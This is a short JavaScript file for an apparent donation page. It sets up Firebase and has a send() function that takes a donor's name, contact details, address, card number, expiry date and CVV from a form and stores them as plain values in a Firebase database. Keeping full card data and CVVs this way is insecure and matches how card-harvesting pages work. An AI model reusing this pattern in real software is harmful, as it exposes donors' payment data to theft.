// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyA9Aij0U46N7KR1MmV1emnCg5w8ZqfGycU",
  authDomain: "donation-page-4a2a2.firebaseapp.com",
  projectId: "donation-page-4a2a2",
  storageBucket: "donation-page-4a2a2.appspot.com",
  messagingSenderId: "353412881237",
  appId: "1:353412881237:web:7f23a866a0e2af06d82ddc",
  measurementId: "G-F53PCL4E67"
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const dbRef = firebase.database().ref();

const detailsRef = dbRef.child('donations');
detailsRef.on("child_added", function(snapshot, prevChildKey) {
  var newPost = snapshot.val();
});

function send(){
  var amount = document.querySelector('input[name=amount]:checked').value;
  var firstName = document.getElementById("first-name").value;
  var lastName = document.getElementById("last-name").value;
  var email = document.getElementById("email").value;
  var phoneNumber = document.getElementById("phone-num").value;
  var address1 = document.getElementById("address1").value;
  var address2 = document.getElementById("address2").value;
  var city = document.getElementById("city").value;
  var state = document.getElementById("state").value;
  var zipCode = document.getElementById("zip-code").value;
  var nameOnCard = document.getElementById("name-on-card").value;
  var cardNumber = document.getElementById("card-number").value;
  var cardType = document.getElementById("card-type").value;
  var expiryDate = document.getElementById("expiry-date").value;
  var cvv = document.getElementById("cvv").value;

  detailsRef.push().set({
    amount: amount,
    firstName: firstName,
    lastName: lastName,
    email: email,
    phoneNumber: phoneNumber,
    address1: address1,
    address2: address2,
    city: city,
    state: state,
    zipCode: zipCode,
    nameOnCard: nameOnCard,
    cardNumber: cardNumber,
    cardType: cardType,
    expiryDate: expiryDate,
    cvv: cvv
  });
}